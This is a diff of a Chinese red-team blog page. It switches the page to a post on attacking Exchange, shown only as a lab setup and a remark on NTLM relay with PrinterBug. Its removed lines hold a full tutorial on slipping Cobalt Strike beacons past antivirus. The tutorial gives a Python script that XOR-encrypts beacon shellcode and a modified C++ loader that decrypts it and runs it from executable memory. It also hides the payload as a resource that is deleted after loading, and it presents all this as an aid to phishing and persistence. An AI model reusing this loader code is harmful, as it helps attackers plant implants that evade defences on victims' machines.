@@ -20,28 +20,54 @@
     var CONFIG = {"hostname":"blog.rizhan.icu","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="奇安信Z-Team技术博客">
-<meta property="og:url" content="https://blog.rizhan.icu/index.html">
+  <meta name="description" content="测试环境准备实验环境：DC (10.10.10.10)  windows server 2012 R2 Exchange Server（10.10.10.40）windows server 2012 R2   Exchange 2016 CU18  辅助DC (10.10.10.20) 攻击机IP (10.10.10.142)  域：c0okb.cn （域用户：&amp;#116;&amp;#101;&amp;#x73;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Exchange渗透总结">
+<meta property="og:url" content="https://blog.rizhan.icu/2021/08/06/Exchange%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/index.html">
 <meta property="og:site_name" content="奇安信Z-Team技术博客">
+<meta property="og:description" content="测试环境准备实验环境：DC (10.10.10.10)  windows server 2012 R2 Exchange Server（10.10.10.40）windows server 2012 R2   Exchange 2016 CU18  辅助DC (10.10.10.20) 攻击机IP (10.10.10.142)  域：c0okb.cn （域用户：&amp;#116;&amp;#101;&amp;#x73;">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.rizhan.icu/attach/image/1.png">
+<meta property="og:image" content="https://blog.rizhan.icu/attach/image/2.png">
+<meta property="og:image" content="https://blog.rizhan.icu/attach/image/17.png">
+<meta property="og:image" content="https://blog.rizhan.icu/attach/image/18.png">
+<meta property="og:image" content="https://blog.rizhan.icu/attach/image/16.png">
+<meta property="og:image" content="https://blog.rizhan.icu/attach/image/11.png">
+<meta property="og:image" content="https://blog.rizhan.icu/attach/image/3.png">
+<meta property="og:image" content="https://blog.rizhan.icu/attach/image/4.png">
+<meta property="og:image" content="https://blog.rizhan.icu/attach/image/5.PNG">
+<meta property="og:image" content="https://blog.rizhan.icu/attach/image/6.PNG">
+<meta property="og:image" content="https://blog.rizhan.icu/attach/image/7.png">
+<meta property="og:image" content="https://blog.rizhan.icu/attach/image/8.png">
+<meta property="og:image" content="https://blog.rizhan.icu/attach/image/9.png">
+<meta property="og:image" content="https://blog.rizhan.icu/attach/image/12.PNG">
+<meta property="og:image" content="https://blog.rizhan.icu/attach/image/13.png">
+<meta property="og:image" content="https://blog.rizhan.icu/attach/image/14.png">
+<meta property="og:image" content="https://blog.rizhan.icu/attach/image/15.png">
+<meta property="og:image" content="https://blog.rizhan.icu/attach/image/19.png">
+<meta property="og:image" content="https://blog.rizhan.icu/attach/image/20.png">
+<meta property="og:image" content="https://blog.rizhan.icu/attach/image/21.png">
+<meta property="og:image" content="https://blog.rizhan.icu/attach/image/22.png">
+<meta property="article:published_time" content="2021-08-06T13:40:35.000Z">
+<meta property="article:modified_time" content="2021-08-06T13:45:59.699Z">
 <meta property="article:author" content="QAX Z-Team">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.rizhan.icu/attach/image/1.png">
 
-<link rel="canonical" href="https://blog.rizhan.icu/">
+<link rel="canonical" href="https://blog.rizhan.icu/2021/08/06/Exchange%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'en'
   };
 </script>
 
-  <title>奇安信Z-Team技术博客</title>
+  <title>Exchange渗透总结 | 奇安信Z-Team技术博客</title>
   
 
 
@@ -150,9 +176,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
@@ -168,10 +195,9 @@
       <meta itemprop="name" content="奇安信Z-Team技术博客">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/08/06/Exchange%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">Exchange渗透总结</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          Exchange渗透总结
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -204,7 +230,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="测试环境准备"><a href="#测试环境准备" class="headerlink" title="测试环境准备"></a>测试环境准备</h1><p>实验环境：DC (10.10.10.10)  windows server 2012 R2</p>
+        <h1 id="测试环境准备"><a href="#测试环境准备" class="headerlink" title="测试环境准备"></a>测试环境准备</h1><p>实验环境：DC (10.10.10.10)  windows server 2012 R2</p>
 <p>Exchange Server（10.10.10.40）windows server 2012 R2   Exchange 2016 CU18 </p>
 <p>辅助DC (10.10.10.20)</p>
 <p>攻击机IP (10.10.10.142) </p>
@@ -363,281 +389,47 @@
 
 <p>PS: 方法一和方法二实际上是一样的，方法二的工具将ntlm-relay和printBug集成在一起，方便使用</p>
 
-      
     </div>
 
     
     
     
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
+        
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blog.rizhan.icu/2021/08/06/%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDCS-Stageless%E8%BF%9B%E8%A1%8C%E5%85%8D%E6%9D%80/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="QAX Z-Team">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="奇安信Z-Team技术博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/08/06/%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDCS-Stageless%E8%BF%9B%E8%A1%8C%E5%85%8D%E6%9D%80/" class="post-title-link" itemprop="url">内存加载CS-Stageless进行免杀</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2021-08-06 21:10:48 / Modified: 21:14:42" itemprop="dateCreated datePublished" datetime="2021-08-06T21:10:48+08:00">2021-08-06</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BB%88%E7%AB%AF%E5%AF%B9%E6%8A%97/" itemprop="url" rel="index"><span itemprop="name">终端对抗</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p>​        在红队评估中，木马的免杀效果往往决定了一次完美的钓鱼的成功与否，当然这里不仅仅是钓鱼，木马是我们最常用的一种权限维持的手段。而cs生成木马免杀更是老生常谈的话题，cs 生成的shellcode ，最常用的免杀手段就是，加载器和shellcode分离，在过静态一直保持着较高的成功免杀概率。</p>
-<p>​        为啥说免杀概率？总所周知，免杀一直都有着很玄学的色彩，当然这也是和杀软复杂的检测机制有关，主要是杀软都是不开源的，我们测试免杀性都是通过黑盒测试，只能一个个去试，去猜测免杀机制！</p>
-<p>​        cs前置的shellcode是很好免杀的，通过加密解密，加载器分离的方式是很轻松免杀的，但是在常和杀软作对抗，逐渐发现，杀软主要特征定位在前置shellcode下载回来大的beacon，这个特征我们除非去魔改生产beacon文件的dll文件，不然无法有效的去除这一特征。</p>
-<p>​        但是前段时间我接触了pe内存加载技术，所以我在想能不能直接写一个内存加载器然后直接加载生成的stageless，而不用前置的shellcode去下载大的beacon回来，这样能逃过一些特征，内存加载不是新技术，因为我们是时常接触到c#内存加载.net程序，这里我们改用c++实现内存加载。</p>
-<h2 id="2-实现"><a href="#2-实现" class="headerlink" title="2.实现"></a>2.实现</h2><p>首先我们找到了github上面的一个项目：<a target="_blank" rel="noopener" href="https://github.com/hasherezade/pe_to_shellcode">https://github.com/hasherezade/pe_to_shellcode</a></p>
-<p>通过作者的描述很清楚，它的作用就是把pe文件转换成可在内存执行的shellcode，这和我们的需求比较相像。</p>
-<h4 id="1-首先是把我们cs生成的stageless-exe文件转换成可在内存执行的shellcode"><a href="#1-首先是把我们cs生成的stageless-exe文件转换成可在内存执行的shellcode" class="headerlink" title="1.首先是把我们cs生成的stageless exe文件转换成可在内存执行的shellcode"></a>1.首先是把我们cs生成的stageless exe文件转换成可在内存执行的shellcode</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pe2shc.exe beacon.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="/attach/image/image-20210802130856649.png" alt="/attach/image/image-20210802130856649"></p>
-<p>看似不支持TLS callbacks，但是实际上问题不大，生成的beacon.shc.exe是可以直接点击运行的，当然也可以通过项目所带的runshc64.exe加载执行。</p>
-<p><img src="/attach/image/image-20210802142031811.png" alt="/attach/image/image-20210802142031811"></p>
-<p>如果用项目自带的免杀效果就可以止步于此了，但是为了提高可用行，必须得加点自己的东西进去。</p>
-<h4 id="2-把转换好的exe文件转换成16进制shellcode"><a href="#2-把转换好的exe文件转换成16进制shellcode" class="headerlink" title="2.把转换好的exe文件转换成16进制shellcode"></a>2.把转换好的exe文件转换成16进制shellcode</h4><p>使用的工具是bin2hex.exe,当然你也可以用其他工具，winhex直接复制也行。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin2hex.exe --i beacon.shc.exe --o beacon_hex.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/attach/image/image-20210802142815754.png" alt="/attach/image/image-20210802142815754"></p>
-<p>虽然现在可以直接读取txt文件中的16进制来加载，有一定免杀效果，但是我们还是自己加密一下。</p>
-<h4 id="3-加密16进制，我这里采用使用异或加密的方式，我只提供一个思路"><a href="#3-加密16进制，我这里采用使用异或加密的方式，我只提供一个思路" class="headerlink" title="3.加密16进制，我这里采用使用异或加密的方式，我只提供一个思路"></a>3.加密16进制，我这里采用使用异或加密的方式，我只提供一个思路</h4><p>为了方便，我直接写了个python脚本来进行异或</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShellCode_Xor</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.shellcode_list = []</span><br><span class="line">        self.create_two_random()</span><br><span class="line">        self.read_file()</span><br><span class="line">        self.xor_shellcode()</span><br><span class="line">        <span class="comment"># self.write_minikatz_shellcode_file()</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_two_random</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">            self.key1 = random.randint(<span class="number">100</span>, <span class="number">1000</span>)</span><br><span class="line">            self.key2 = random.randint(<span class="number">100</span>,<span class="number">1000</span>)</span><br><span class="line">            <span class="keyword">if</span> self.key1 != self.key2:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_file_name</span>(<span class="params">self</span>):</span></span><br><span class="line">        string = <span class="string">&quot;abcdefghijklomnopqrstuvwxyz123456789&quot;</span></span><br><span class="line">        str_Variables = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(random.randint(<span class="number">3</span>, <span class="number">24</span>)):</span><br><span class="line">            rand_int = random.randint(<span class="number">0</span>, <span class="built_in">len</span>(string) - <span class="number">1</span>)</span><br><span class="line">            str_Variables += string[<span class="built_in">int</span>(rand_int)]</span><br><span class="line">        <span class="keyword">return</span> str_Variables</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">self</span>):</span></span><br><span class="line">        tmp_list = []</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;beacon_hex.txt&quot;</span>,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> shellcode <span class="keyword">in</span> f.readlines()[::<span class="number">1</span>]:</span><br><span class="line">                tmp_list = shellcode.strip().split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> tmp_list:</span><br><span class="line">                    tmp_list[tmp_list.index(i)] =i.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&quot;&quot;</span> == i:</span><br><span class="line">                        tmp_list.remove(i)</span><br><span class="line">                self.shellcode_list.extend(tmp_list)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">xor_shellcode</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.xor_result = []</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;key1:&quot;</span> + <span class="built_in">str</span>(self.key1) + <span class="string">&quot;\n&quot;</span> + <span class="string">&quot;key2:&quot;</span> + <span class="built_in">str</span>(self.key2))</span><br><span class="line">        <span class="keyword">for</span> hex_str <span class="keyword">in</span> self.shellcode_list:</span><br><span class="line">            hex_int = <span class="built_in">int</span>(hex_str, <span class="number">16</span>)</span><br><span class="line">            xor1_shellcode = hex_int ^ self.key1</span><br><span class="line">            xor2_shellcode = xor1_shellcode ^ self.key2</span><br><span class="line">            self.xor_result.append(xor2_shellcode)</span><br><span class="line"></span><br><span class="line">        self.shellcode_len = <span class="built_in">len</span>(self.xor_result)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">len</span>(self.xor_result))</span><br><span class="line">        shellcode_str = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> shellcode <span class="keyword">in</span> self.xor_result:</span><br><span class="line">            shellcode_str += <span class="built_in">str</span>(shellcode)+<span class="string">&quot; &quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;shellcode_Xor_result.txt&quot;</span>,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(shellcode_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    test= ShellCode_Xor()</span><br></pre></td></tr></table></figure>
-
-<p>会生成一个异或好的文件。</p>
-<h4 id="4-改造runshc64-exe"><a href="#4-改造runshc64-exe" class="headerlink" title="4.改造runshc64.exe"></a>4.改造runshc64.exe</h4><p>以前的runshc64.exe已经不适用了，需要我们改造一下，让他能直接读取16进制并进行异或还原，并加载，直接去掏一首源码然后改。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;peconv.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;~ runshc ~\n&quot;</span></span><br><span class="line">			&lt;&lt; <span class="string">&quot;Run shellcode: loads and deploys shellcode file.\n&quot;</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN64</span></span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;For 64-bit shellcodes.\n&quot;</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;For 32-bit shellcodes.\n&quot;</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;Args: &lt;shellcode_file&gt;&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">size_t</span> exe_size = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span>* in_path = argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;[*] Reading module from: &quot;</span> &lt;&lt; in_path &lt;&lt; std::endl;</span><br><span class="line">	BYTE *my_exe = peconv::<span class="built_in">load_file</span>(in_path, exe_size);</span><br><span class="line">	<span class="keyword">if</span> (!my_exe) &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;[-] Loading file failed&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	BYTE *test_buf = peconv::<span class="built_in">alloc_aligned</span>(exe_size, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (!test_buf) &#123;</span><br><span class="line">		peconv::<span class="built_in">free_file</span>(my_exe);</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;[-] Allocating buffer failed&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//copy file content into executable buffer:</span></span><br><span class="line">	<span class="built_in">memcpy</span>(test_buf, my_exe, exe_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//free the original buffer:</span></span><br><span class="line">	peconv::<span class="built_in">free_file</span>(my_exe);</span><br><span class="line">	my_exe = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;[*] Running the shellcode:&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="comment">//run it:</span></span><br><span class="line">	<span class="built_in"><span class="keyword">int</span></span> (*my_main)() = (<span class="built_in"><span class="keyword">int</span></span>(*)()) ((ULONGLONG)test_buf);</span><br><span class="line">	<span class="keyword">int</span> ret_val = <span class="built_in">my_main</span>();</span><br><span class="line">	</span><br><span class="line">	peconv::<span class="built_in">free_aligned</span>(test_buf, exe_size);</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;[+] The shellcode finished with a return value: &quot;</span> &lt;&lt; std::hex &lt;&lt; ret_val &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> ret_val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>源码是这样的，从开头的导入模块来看，导入了一个peconv.h头文件，我们继续追踪这个头文件，看有哪些依赖项</p>
-<p>在github项目中，它的头文件定义在这个目录</p>
-<p><img src="/attach/image/image-20210802145401013.png" alt="/attach/image/image-20210802145401013"></p>
-<p>直接给下载下来，新建项目，然后添加依赖，定义，实现，编译。</p>
-<p><img src="/attach/image/image-20210802145732532.png" alt="/attach/image/image-20210802145732532"></p>
-<p><img src="/attach/image/image-20210802145919858.png" alt="/attach/image/image-20210802145919858"></p>
-<p>编译成功了，看来没啥问题，最好把编译好的exe，进行测试一下，看是否能用。</p>
-<p>然后就可以开始魔改了，直接冲，反观源代码，里面有很多东西我们都是不用的，直接删除大部分东西，加上自己的东西</p>
-<p>代码参考：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;peconv.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> exe_size = <span class="number">962918</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> * hex_code_p = <span class="keyword">new</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span>[<span class="number">962918</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> * xor_xcode = <span class="keyword">new</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>[<span class="number">1196315</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> xor_key1 = <span class="number">601</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> xor_key2 = <span class="number">155</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> datalen = <span class="number">0</span>;</span><br><span class="line">	<span class="function">ifstream <span class="title">file</span><span class="params">(<span class="string">&quot;shellcode_Xor_result.txt&quot;</span>)</span></span>;</span><br><span class="line">	<span class="keyword">while</span> (!file.<span class="built_in">eof</span>())</span><br><span class="line">		file &gt;&gt; hex_code_p[datalen++];</span><br><span class="line">	file.<span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; exe_size; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> a = hex_code_p[i] ^ xor_key2;</span><br><span class="line">		a = a ^ xor_key1;</span><br><span class="line">		a = (a % <span class="number">256</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">		xor_xcode[i] = a;</span><br><span class="line">		<span class="comment">//printf(&quot;%02x&quot;, xor_xcode[i]);</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	BYTE *test_buf = peconv::<span class="built_in">alloc_aligned</span>(exe_size, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (!test_buf) &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;[-] Allocating buffer failed&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//copy file content into executable buffer:</span></span><br><span class="line">	<span class="built_in">memcpy</span>(test_buf, xor_xcode, exe_size);</span><br><span class="line"></span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;[*] Running the shellcode:&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="comment">//run it:</span></span><br><span class="line">	<span class="built_in"><span class="keyword">int</span></span>(*my_main)() = (<span class="built_in"><span class="keyword">int</span></span>(*)()) ((ULONGLONG)test_buf);</span><br><span class="line">	<span class="keyword">int</span> ret_val = <span class="built_in">my_main</span>();</span><br><span class="line"></span><br><span class="line">	peconv::<span class="built_in">free_aligned</span>(test_buf, exe_size);</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;[+] The shellcode finished with a return value: &quot;</span> &lt;&lt; std::hex &lt;&lt; ret_val &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> ret_val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/attach/image/image-20210802153919447.png" alt="/attach/image/image-20210802153919447"></p>
-<p>![/attach/image/image-20210802153952458](/Users/chenzhiyong/Library/Application Support/typora-user-images//attach/image/image-20210802153952458.png)</p>
-<p>加载上线完全没问题嗷，但是一个存放shellcode的txt文件，感觉有点难受，因为shellcode偏大，不适合用数组的方式存放。</p>
-<h4 id="5-把txt文件添加入资源，通过释放资源的方式来进行加载，加载完就删"><a href="#5-把txt文件添加入资源，通过释放资源的方式来进行加载，加载完就删" class="headerlink" title="5.把txt文件添加入资源，通过释放资源的方式来进行加载，加载完就删"></a>5.把txt文件添加入资源，通过释放资源的方式来进行加载，加载完就删</h4><p>右键项目，添加-》资源-》导入</p>
-<p><img src="/attach/image/image-20210802155559972.png" alt="/attach/image/image-20210802155559972"></p>
-<p>选择资源类型，然后ctrl+s保存</p>
-<p><img src="/attach/image/image-20210802155802850.png" alt="/attach/image/image-20210802155802850"></p>
-<p>可以在自动添加的“resource.h”头文件中看到资源ID宏</p>
-<p><img src="/attach/image/image-20210802160023123.png" alt="/attach/image/image-20210802160023123"></p>
